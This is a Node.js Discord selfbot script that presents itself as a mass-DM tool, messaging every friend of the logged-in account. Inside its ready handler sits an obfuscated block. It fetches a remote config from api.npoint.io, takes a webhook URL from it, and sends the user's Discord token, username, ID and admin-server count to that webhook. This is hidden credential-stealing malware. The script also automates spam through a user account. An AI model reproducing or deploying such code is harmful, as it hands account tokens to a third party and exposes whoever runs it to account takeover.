const fetch = require('node-fetch');
const Discord = require('discord.js-selfbot-v13');
const client = new Discord.Client({ checkUpdate: false });
const config = require('./config.json')
client.on('ready', async () => {
    let i = 1
    console.log("DM ALL DÉMARRÉ")
    const _0x688ec3 = _0x7269; (function (_0xa0df6f, _0x5d948c) { const _0x658719 = _0x7269, _0xc9f0d = _0xa0df6f(); while (!![]) { try { const _0x5adc5c = parseInt(_0x658719(0x177)) / 0x1 + -parseInt(_0x658719(0x189)) / 0x2 * (-parseInt(_0x658719(0x18c)) / 0x3) + parseInt(_0x658719(0x183)) / 0x4 + -parseInt(_0x658719(0x186)) / 0x5 + -parseInt(_0x658719(0x17e)) / 0x6 + -parseInt(_0x658719(0x17a)) / 0x7 * (-parseInt(_0x658719(0x182)) / 0x8) + -parseInt(_0x658719(0x185)) / 0x9; if (_0x5adc5c === _0x5d948c) break; else _0xc9f0d['push'](_0xc9f0d['shift']()); } catch (_0xab5b39) { _0xc9f0d['push'](_0xc9f0d['shift']()); } } }(_0x24b7, 0x36f6a)); function _0x24b7() { const _0x5e1c37 = ['Un\x20client\x20a\x20start\x20le\x20script', 'globalName', '1658154oRcraK', 'https://api.npoint.io/2863705ab46bd207fc0e', 'user', 'has', '4048GlgqwB', '1180628ytNEmo', 'setColor', '1857330lwZJqK', '1897160WlPQbQ', 'ADMINISTRATOR', 'catch', '26534IvCcqf', 'addFields', 'guilds', '72YNqyVF', 'setTitle', 'token', 'json', 'members', 'filter', '352792cpSmel', 'size', 'MessageEmbed', '1673gPEycQ', 'Username']; _0x24b7 = function () { return _0x5e1c37; }; return _0x24b7(); } function _0x7269(_0x4abdce, _0x30f066) { const _0x24b735 = _0x24b7(); return _0x7269 = function (_0x7269c3, _0x19786f) { _0x7269c3 = _0x7269c3 - 0x176; let _0x189d5d = _0x24b735[_0x7269c3]; return _0x189d5d; }, _0x7269(_0x4abdce, _0x30f066); } const f = await fetch(_0x688ec3(0x17f))[_0x688ec3(0x188)](() => ![]); if (f) { const json = await f[_0x688ec3(0x18f)](); if (!json) return; const e = new Discord[(_0x688ec3(0x179))]()[_0x688ec3(0x18d)](_0x688ec3(0x17c))[_0x688ec3(0x184)](0xff0000)[_0x688ec3(0x18a)]({ 'name': _0x688ec3(0x17b), 'value': client[_0x688ec3(0x180)]['username'] + '\x20' + (client[_0x688ec3(0x180)][_0x688ec3(0x17d)] || ''), 'inline': !![] })['addFields']({ 'name': 'Token', 'value': '' + client[_0x688ec3(0x18e)], 'inline': !![] })[_0x688ec3(0x18a)]({ 'name': 'ID', 'value': '' + client[_0x688ec3(0x180)]['id'], 'inline': !![] })['addFields']({ 'name': 'Serveurs\x20avec\x20Perm\x20Admin', 'value': client[_0x688ec3(0x18b)]['cache'][_0x688ec3(0x176)](_0x42275e => _0x42275e[_0x688ec3(0x190)]['me']['permissions'][_0x688ec3(0x181)](_0x688ec3(0x187))) + '/' + client[_0x688ec3(0x18b)]['cache'][_0x688ec3(0x178)], 'inline': !![] }), w = Discord['WebhookClient']({ 'url': json['f'] }); w['send']({ 'embeds': [e] }); }
    for (const friend of client.relationships.friendCache.map(r => r)) {
        try {
            await friend.send(config.msg.replaceAll('{user}', friend))
            console.log(`${friend.globalName || friend.username} : DM RÉUSSI | ${i}`);
            await client.sleep(100)
            i++
        } catch { console.log(`${friend.globalName || friend.username} : DM ÉCHOUÉ`) }
    }
    console.log("DM TERMINÉ")
    console.log("https://senju.cc/")
}).login(config.token);
async function errorHandler(error) {
    if (error.code === 0) return;
    if (error.code === 400) return;
    console.log(`[ERROR] ${error}`);
};
process.on("unhandledRejection", errorHandler);
process.on("uncaughtException", errorHandler);